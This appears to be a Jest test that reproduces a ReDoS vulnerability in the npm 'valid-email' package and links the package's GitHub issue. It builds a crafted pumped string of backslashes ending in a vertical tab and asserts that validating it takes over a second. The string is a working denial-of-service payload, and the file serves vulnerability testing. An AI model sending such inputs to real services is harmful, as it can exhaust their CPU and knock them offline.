//https://github.com/johnhenry/valid-email/issues/4
test("ReDos in valid-email", () => {
  const validate = require("valid-email");
  const measureTime = require("./utils").measureTime;

  var pump = "\\\\a\\\\\\a";
  var attackString = "";
  for (var i = 0; i < 9; i++) {
    attackString += pump;
  }

  attackString += "\v";
  var badEmail = `${attackString}@google.com`;

  let t = measureTime(function () {
    validate(badEmail);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
